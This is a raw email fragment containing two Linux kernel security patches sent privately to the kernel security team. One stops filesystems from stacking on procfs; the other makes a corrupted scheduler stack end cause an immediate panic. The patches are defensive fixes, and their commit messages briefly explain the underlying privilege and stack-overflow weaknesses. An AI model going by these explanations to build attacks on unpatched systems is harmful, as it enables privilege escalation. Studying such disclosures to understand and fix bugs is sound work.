AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==

--------------070000050502060506050409
Content-Type: text/plain; charset=UTF-8;
 name="1of3.patch"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
 filename="1of3.patch"

From: Jann Horn <jannh@google.com>
To: security@kernel.org
Cc: Jann Horn <jannh@google.com>
Subject: [PATCH 1/3] proc: prevent stacking filesystems on top
Date: Wed,  1 Jun 2016 11:55:05 +0200
Message-Id: <1464774907-7753-1-git-send-email-jannh@google.com>
X-Mailer: git-send-email 2.8.0.rc3.226.g39d4020
In-Reply-To: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmai=
l.com>
References: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmail=
.com>
X-Spam-Status: No, hits=3D-5.1 required=3D5 tests=3DDKIM_SIGNED,DKIM_VALID,=
DKIM_VALID_AU,DKIM_VERIFIED
X-Spam-Checker-Version: SpamAssassin 3.4.0-outflux_revision__1.66__
X-Virus-Scanned: ClamAV using ClamSMTP
Envelope-To: kees@outflux.net
X-MIMEDefang-Filter: outflux$Revision: 1.316 $
X-HELO: www.outflux.net
X-Scanned-By: MIMEDefang 2.73

This prevents stacking filesystems (ecryptfs and overlayfs)
from using procfs as lower filesystem. There is too much magic
going on inside procfs, and there is no good reason to stack
stuff on top of procfs.

(For example, procfs does access checks in VFS open handlers,
and ecryptfs by design calls open handlers from a kernel
thread that doesn't drop privileges or so.)

Signed-off-by: Jann Horn <jannh@google.com>
Cc: stable@vger.kernel.org
---
 fs/proc/root.c | 7 +++++++
 1 file changed, 7 insertions(+)

diff --git a/fs/proc/root.c b/fs/proc/root.c
index 55bc7d6..0670278 100644
--- a/fs/proc/root.c
+++ b/fs/proc/root.c
@@ -121,6 +121,13 @@ static struct dentry *proc_mount(struct file_system_ty=
pe *fs_type,
 	if (IS_ERR(sb))
 		return ERR_CAST(sb);
=20
+	/*
+	 * procfs isn't actually a stacking filesystem; however, there is
+	 * too much magic going on inside it to permit stacking things on
+	 * top of it
+	 */
+	sb->s_stack_depth =3D FILESYSTEM_MAX_STACK_DEPTH;
+
 	if (!proc_parse_options(options, ns)) {
 		deactivate_locked_super(sb);
 		return ERR_PTR(-EINVAL);
--=20
2.8.0.rc3.226.g39d4020



--------------070000050502060506050409
Content-Type: text/x-patch;
 name="3of3.patch"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
 filename="3of3.patch"

From: Jann Horn <jannh@google.com>
To: security@kernel.org
Cc: Jann Horn <jannh@google.com>
Subject: [PATCH 3/3] sched: panic on corrupted stack end
Date: Wed,  1 Jun 2016 11:55:07 +0200
Message-Id: <1464774907-7753-3-git-send-email-jannh@google.com>
X-Mailer: git-send-email 2.8.0.rc3.226.g39d4020
In-Reply-To: <1464774907-7753-1-git-send-email-jannh@google.com>
References: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmail=
.com>
 <1464774907-7753-1-git-send-email-jannh@google.com>
X-Spam-Status: No, hits=3D-5.1 required=3D5 tests=3DDKIM_SIGNED,DKIM_VALID,=
DKIM_VALID_AU,DKIM_VERIFIED
X-Spam-Checker-Version: SpamAssassin 3.4.0-outflux_revision__1.66__
X-Virus-Scanned: ClamAV using ClamSMTP
Envelope-To: kees@outflux.net
X-MIMEDefang-Filter: outflux$Revision: 1.316 $
X-HELO: www.outflux.net
X-Scanned-By: MIMEDefang 2.73

Until now, hitting this BUG_ON caused a recursive oops (because oops
handling involves do_exit(), which calls into the scheduler, which in
turn raises an oops), which caused stuff below the stack to be
overwritten until a panic happened (e.g. via an oops in interrupt context,
caused by the overwritten CPU index in the thread_info).

Just panic directly.

Signed-off-by: Jann Horn <jannh@google.com>
---
 kernel/sched/core.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/kernel/sched/core.c b/kernel/sched/core.c
index 7f2cae4..8dbe9be 100644
--- a/kernel/sched/core.c
+++ b/kernel/sched/core.c
@@ -3156,7 +3156,8 @@ static noinline void __schedule_bug(struct task_struc=
t *prev)
 static inline void schedule_debug(struct task_struct *prev)
 {
 #ifdef CONFIG_SCHED_STACK_END_CHECK
-	BUG_ON(task_stack_end_corrupted(prev));
+	if (task_stack_end_corrupted(prev))
+		panic("corrupted stack end detected inside scheduler\n");
 #endif
=20
 	if (unlikely(in_atomic_preempt_off())) {
--=20
2.8.0.rc3.226.g39d4020


--------------070000050502060506050409--

--KurOk4gPSfS3NShJjJTnc2c6wP2p5h2uJ--

--oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCgAGBQJXWzUvAAoJEAUvNnAY1cPY4HAP/13q9WtZN8s3xJ61OcW6ftmg
mJ4rI8fvF3KvF/n/TR13NDWCrppqKJqlYdtDgtTFBMyPixAyCdAls1uTyWvJtBAw
hgCqNxiC3GYkIW9LTetZhp3NBwUnX04rFtwR7E999j8lmWU8p4eoud2llQSoPht4
KOeWyjpFKD7TH/Uj87fvcNQ5rwlOoDt4bAz/jvTl6tfsDa8eO0zgv0WGnmWq7MGH
hixCrrmEaMKjVJeLONDaYUXlO4kDisCk5sqLhNZMzzMq5rciQ3Z+bH7pm3edz5BZ
RmJ7VS7czA2nV4p1LqGjruM7UkwbxeUZIOVWGHa9jtEw+zIvVYAl31g5k1dr0RL6
9H8JsP5b9DixTzobhdE3haRXctIaWGVo+/IbZW/PtBkrdHDqvuj8ZzbhM+sca1OO
MKABcXzjcpHj20syDEUqpxOojwYe7YBnLE6KDK3nQGpLWVgXIQR11nH8Ug9JeqpC
oHdV2bcU43tQj3agZdOdx9MUA0HKILPEWfuvcgGezbGNZvxyK0U0SPExi1Jh/ul+
w8uz1YP7dZ0FuLEpakGnuzobHpibr/i747v7R/BO9O7qpm5ym2AsewpYzIBZiAT9
AhIYg6sITSyeK0e80LP+5relQr9WG+tfZQWyLz9gtvtIwfz5eFceq64ktDPloNLU
Op6/n5f96mbw7RNa2SV9
=50sO
-----END PGP SIGNATURE-----

--oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35--
